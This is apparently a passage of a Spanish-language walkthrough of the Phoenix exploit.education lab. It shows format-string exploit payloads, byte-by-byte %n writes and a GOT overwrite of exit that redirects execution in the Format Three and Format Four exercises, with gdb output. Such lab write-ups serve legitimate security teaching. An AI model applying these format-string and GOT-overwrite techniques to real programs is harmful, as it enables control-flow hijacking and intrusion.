DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00017845, wanted 0x64457845!
```

Y volvemos a hacer lo mismo para el siguiente byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x01787845, wanted 0x64457845!

>>> int("145",16)-int("78",16)
205

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x02457845, wanted 0x64457845!
```

Y para el ultimo byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45457845, wanted 0x64457845!

>>> int("64",16)-int("45",16)
31

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'A'*31+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```

## Format Four

```c
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```

Obteniendo las direcciones utiles.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-four | grep congrat
08048503 T congratulations

user@phoenix-amd64:/opt/phoenix/i486$ objdump -R ./format-four | grep exit
080497e4 R_386_JUMP_SLOT   exit -> 51515151
```

Como en el ejemplo anterior, llenaremos de **%x**, para verificar si encontramos los hexadecimales de las **AAAA**.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 804857d ffffc730 ffffc730 fff 0 41414141
```

  Como ya vimos en el **Format Three**, manejaremos un archivo llamado script.py en el directorio /tmp. Y empezaremos escribiendo el script con los valores que ya obtuvimos.

```python
#!/bin/python

buf ='\x08\x04\x97\xe4'[::-1]
buf+='\x08\x04\x97\xe5'[::-1]
buf+='\x08\x04\x97\xe6'[::-1]
buf+='\x08\x04\x97\xe7'[::-1]
buf+='%x '*11
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'

print(buf)
```

Y luego lo que haremos será usar el gdb.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ gdb -q ./format-four 

#Luego ejecutamos el siguiente comando en la consola de gdb
(gdb) run < <(python /tmp/script.py)

#Podemos ver que el programa se paró y en el registro eip obtenemos lo siguiente.
$eip   : 0x51515151 ("QQQQ"?)
```

Nosotros queremos que el $eip apunte a: **08048503**. Entonces haremos lo mismo que en el ejemplo anterior.

```bash
>>> int("103",16)-int("51",16)
178

$ cat /tmp/script.py

#!/bin/python

buf ='\x08\x04\x97\xe4'[::-1]
buf+='\x08\x04\x97\xe5'[::-1]
buf+='\x08\x04\x97\xe6'[::-1]
buf+='\x08\x04\x97\xe7'[::-1]
buf+='%x '*11
buf+='A'*178+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'

print(buf)

$eip   : 0x3030303
```

Y de la misma manera para los demas bytes.

```
#Para el segundo byte
>>> int("85",16)-int("03",16)
130
#Ejecutando el GDB de nuevo
$eip   : 0x85858503
#Lo que queremos
$eip   : 0x08048503

#Para el tercer byte
>>> int("104",16)-int("85",16)
127
#Ejecutando el GDB de nuevo
$eip   : 0x4048503
#Lo que queremos
$eip   : 0x08048503

#Para el cuarto y ultimo byte
>>> int("08",16)-int("04",16)
4
#Ejecutando el GDB de nuevo
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
...
```

# Heap Overflow

## Heap Zero

## Heap One
## Heap Two
## Heap Three
# Net Overflow

## Net Zero

## Net One
## Net Two

# Final Problem

## Final Zero
## Final One
## Final Two

